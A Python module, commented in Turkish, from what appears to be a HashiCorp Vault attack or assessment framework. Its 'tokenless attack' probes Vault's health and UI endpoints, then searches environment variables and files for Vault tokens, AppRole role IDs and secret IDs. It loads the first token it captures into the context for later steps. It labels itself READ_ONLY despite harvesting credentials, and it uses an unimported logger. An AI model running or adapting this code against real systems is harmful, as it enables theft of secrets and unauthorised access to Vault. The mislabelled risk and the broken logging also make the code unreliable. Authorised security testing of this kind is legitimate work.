from typing import Optional
from core.tls_config import vault_request
import os
import subprocess
from ...context import ExecutionContext
from ...registry import BaseExecutionModule, ExecutionResult, RiskLevel


class UnauthenticatedAttackModule(BaseExecutionModule):
    def __init__(self):
        super().__init__(
            module_id="unauthenticated.attack",
            title="Tokensiz Vault Saldırısı - Keşif + Token Avcılığı",
            risk_level=RiskLevel.READ_ONLY,
            domain="general",
            description=(
                "Token olmadan Vault'u keşfeder, environment ve dosya sisteminde token arar, "
                "zafiyetleri tespit eder."
            ),
            default_enabled=False,
        )

    def can_run(self, context: ExecutionContext) -> bool:
        return bool(getattr(context, "vault_addr", None))

    def execute(self, context: ExecutionContext, params: Optional[dict] = None) -> ExecutionResult:
        params = params or {}

        if not self.can_run(context):
            return ExecutionResult(
                status="skipped",
                message="Tokensiz saldırı için vault_addr gerekli.",
                evidence={"missing": ["vault_addr"]},
            )

        target = context.vault_addr
        results = {}
        findings = []

        # 1. Unauthenticated Recon
        logger.info("[*] [Tokensiz] Unauthenticated Recon başlatılıyor...")
        recon_results = self._run_recon(target)
        results["recon"] = recon_results
        if recon_results.get("version"):
            findings.append(f"Vault sürümü: {recon_results['version']}")

        # 2. Environment taraması
        logger.info("[*] [Tokensiz] Environment taranıyor...")
        env_tokens = self._scan_environment()
        results["env_tokens"] = env_tokens
        if env_tokens:
            findings.append(f"Environment'da {len(env_tokens)} token bulundu.")

        # 3. Dosya sistemi taraması (hijack-path)
        search_path = params.get("search_path", ".")
        logger.info(f"[*] [Tokensiz] Dosya sistemi taranıyor: {search_path}")
        file_results = self._scan_files(search_path)
        results["file_tokens"] = file_results
        if file_results.get("tokens"):
            findings.append(f"Dosyalarda {len(file_results['tokens'])} token bulundu.")
        if file_results.get("role_ids"):
            findings.append(f"{len(file_results['role_ids'])} Role ID bulundu.")
        if file_results.get("secret_ids"):
            findings.append(f"{len(file_results['secret_ids'])} Secret ID bulundu.")

        # 4. Elde edilen token varsa context'e ekle
        all_tokens = []
        if env_tokens:
            all_tokens.extend(env_tokens)
        if file_results.get("tokens"):
            all_tokens.extend(file_results["tokens"])

        if all_tokens:
            context.token = all_tokens[0]
            context.captured_token = all_tokens[0]
            findings.append(f"Token bulundu: {all_tokens[0][:8]}...")
            results["captured_token"] = all_tokens[0]

        # 5. Vault sealed durumu
        sealed = recon_results.get("sealed", False)
        results["sealed"] = sealed
        if sealed:
            findings.append("Vault sealed durumunda. Unseal key gerekli.")

        # Findings kaydet
        if findings:
            context.add_finding(
                title="HIGH: Tokensiz Keşif Tamamlandı",
                description=" | ".join(findings),
                severity="HIGH",
                evidence=results,
            )

        return ExecutionResult(
            status="success" if findings else "partial",
            message=f"Tokensiz saldırı tamamlandı. {len(findings)} bulgu.",
            evidence=results,
        )

    def _run_recon(self, target):
        """Unauthenticated recon çalıştır"""
        results = {}
        try:
            # Health
            resp = vault_request("GET", f"{target}/v1/sys/health", timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                results["version"] = data.get("version")
                results["sealed"] = data.get("sealed", False)
                results["cluster_name"] = data.get("cluster_name")
                results["cluster_id"] = data.get("cluster_id")
            # UI
            resp = vault_request("GET", f"{target}/ui/", timeout=5)
            results["ui_accessible"] = resp.status_code == 200
        except Exception as e:
            results["error"] = str(e)
        return results

    def _scan_environment(self):
        """Environment'dan Vault token'larını bul"""
        tokens = []
        for key, value in os.environ.items():
            if any(k in key.lower() for k in ["vault_token", "vault_addr", "token"]):
                if value and len(value) > 10:
                    tokens.append(value)
            # VAULT_TOKEN
            if key == "VAULT_TOKEN" and value:
                tokens.append(value)
        return list(set(tokens))

    def _scan_files(self, search_path):
        """Dosya sisteminde token ara"""
        results = {"tokens": [], "role_ids": [], "secret_ids": []}
        patterns = [
            (r"hvs\.[A-Za-z0-9]+", "tokens"),
            (r"VAULT_TOKEN\s*=\s*['\"]?([A-Za-z0-9./]+)", "tokens"),
            (r"role_id\s*=\s*['\"]?([a-f0-9-]+)", "role_ids"),
            (r"secret_id\s*=\s*['\"]?([a-f0-9-]+)", "secret_ids"),
            (r"VAULT_ROLE_ID\s*=\s*['\"]?([a-f0-9-]+)", "role_ids"),
            (r"VAULT_SECRET_ID\s*=\s*['\"]?([a-f0-9-]+)", "secret_ids"),
        ]
        try:
            for root, dirs, files in os.walk(search_path):
                # Skip large dirs
                if any(d in root for d in [".git", "node_modules", ".venv", "__pycache__"]):
                    continue
                for file in files:
                    if file.endswith((".txt", ".env", ".conf", ".json", ".yaml", ".yml", ".tf", ".py", ".js", ".sh")):
                        try:
                            path = os.path.join(root, file)
                            if os.path.getsize(path) > 1024 * 1024:  # 1MB
                                continue
                            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                                content = f.read()
                                for pattern, key in patterns:
                                    import re
                                    matches = re.findall(pattern, content)
                                    if matches:
                                        results[key].extend(matches)
                        except Exception as e:
                            from core.logger import logger
                            logger.warning(f"Pattern match failed on file {path}: {e}")
                            pass
        except Exception:
            pass
        # Unique
        results["tokens"] = list(set(results["tokens"]))
        results["role_ids"] = list(set(results["role_ids"]))
        results["secret_ids"] = list(set(results["secret_ids"]))
        return results
